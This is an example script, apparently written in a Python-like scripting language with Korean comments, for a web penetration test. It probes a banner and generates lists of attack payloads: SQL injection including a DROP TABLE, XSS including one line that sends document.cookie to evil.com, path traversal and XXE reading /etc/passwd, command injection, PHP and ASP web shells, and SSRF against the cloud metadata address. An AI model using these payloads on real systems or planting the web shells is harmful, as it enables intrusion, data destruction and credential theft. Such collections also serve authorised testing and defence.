# 고급 웹 애플리케이션 테스트 예제
print("웹 애플리케이션 보안 테스트 시작...")

target_url = "http://vulnerable-app.com"
target_ip = "192.168.1.100"
target_port = 80

# 웹 서버 확인
if scan_port(target_ip, target_port) {
    print("웹 서버 발견!")
    
    # 배너 그래빙
    banner = recv(target_ip, target_port, 512)
    print("웹 서버 배너:", banner)
    
    # 서버 식별
    if "Apache" in banner {
        print("Apache 웹서버 탐지")
        log("Apache 서버 발견", "INFO")
    } else if "nginx" in banner {
        print("Nginx 웹서버 탐지")
        log("Nginx 서버 발견", "INFO")
    } else if "IIS" in banner {
        print("Microsoft IIS 서버 탐지")
        log("IIS 서버 발견", "INFO")
    }
}

# SQL 인젝션 테스트 페이로드들
sql_payloads = [
    "' OR 1=1--",
    "' UNION SELECT null,null,null--",
    "'; DROP TABLE users;--",
    "admin'--",
    "' OR 'x'='x",
    "1' UNION SELECT user(),version(),database()--"
]

print("SQL 인젝션 페이로드 생성...")
for payload in sql_payloads {
    encoded_payload = base64_encode(payload)
    printf("SQL 페이로드: %s", payload)
    printf("인코딩된 페이로드: %s", encoded_payload)
}

# XSS 테스트 페이로드들
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<script>fetch('http://evil.com/log?data='+btoa(document.cookie))</script>"
]

print("XSS 페이로드 생성...")
for payload in xss_payloads {
    encoded_payload = base64_encode(payload)
    printf("XSS 페이로드: %s", payload)
    printf("URL 인코딩용: %s", encoded_payload)
}

# 디렉터리 트래버설 페이로드들
lfi_payloads = [
    "../../../../etc/passwd",
    "../../../../windows/system32/drivers/etc/hosts",
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//....//etc//passwd",
    "file:///etc/passwd"
]

print("LFI/디렉터리 트래버설 페이로드 생성...")
for payload in lfi_payloads {
    encoded_payload = base64_encode(payload)
    printf("LFI 페이로드: %s", payload)
    printf("인코딩: %s", encoded_payload)
}

# 명령어 인젝션 페이로드들
cmd_payloads = [
    "; ls",
    "| whoami",
    "`id`",
    "$(whoami)",
    "; cat /etc/passwd",
    "| type c:\\windows\\system32\\drivers\\etc\\hosts",
    "; powershell -c Get-Process"
]

print("명령어 인젝션 페이로드 생성...")
for payload in cmd_payloads {
    encoded_payload = base64_encode(payload)
    printf("CMD 페이로드: %s", payload)
    printf("인코딩: %s", encoded_payload)
}

# 웹셸 페이로드들
webshell_payloads = [
    "<?php system($_GET['cmd']); ?>",
    "<%eval request(\"cmd\")%>",
    "<script language='javascript'>eval(Request.Form('cmd'))</script>",
    "<?php echo shell_exec($_GET['cmd']); ?>"
]

print("웹셸 페이로드 생성...")
for payload in webshell_payloads {
    encoded_payload = base64_encode(payload)
    printf("웹셸 페이로드: %s", payload)
    printf("인코딩: %s", encoded_payload)
}

# XXE 페이로드
xxe_payload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
print("XXE 페이로드:", xxe_payload)
print("XXE 인코딩:", base64_encode(xxe_payload))

# SSRF 페이로드들
ssrf_payloads = [
    "http://localhost:22",
    "http://127.0.0.1:3389",
    "http://169.254.169.254/latest/meta-data/",
    "file:///etc/passwd",
    "gopher://127.0.0.1:25/"
]

print("SSRF 페이로드 생성...")
for payload in ssrf_payloads {
    encoded_payload = base64_encode(payload)
    printf("SSRF 페이로드: %s", payload)
    printf("인코딩: %s", encoded_payload)
}

# 보고서 생성
report_content = "웹 애플리케이션 보안 테스트 보고서\n"
report_content = report_content + "===========================\n\n"
report_content = report_content + "타겟: " + target_url + "\n"
report_content = report_content + "IP: " + target_ip + "\n"
report_content = report_content + "포트: " + str(target_port) + "\n\n"

report_content = report_content + "생성된 페이로드 수:\n"
report_content = report_content + "- SQL 인젝션: " + str(len(sql_payloads)) + "개\n"
report_content = report_content + "- XSS: " + str(len(xss_payloads)) + "개\n"
report_content = report_content + "- LFI: " + str(len(lfi_payloads)) + "개\n"
report_content = report_content + "- 명령어 인젝션: " + str(len(cmd_payloads)) + "개\n"
report_content = report_content + "- 웹셸: " + str(len(webshell_payloads)) + "개\n"
report_content = report_content + "- SSRF: " + str(len(ssrf_payloads)) + "개\n\n"

file_write("web_pentest_report.txt", report_content)
print("웹 애플리케이션 테스트 보고서가 web_pentest_report.txt에 저장되었습니다.")

log("웹 애플리케이션 보안 테스트 완료", "SUCCESS")
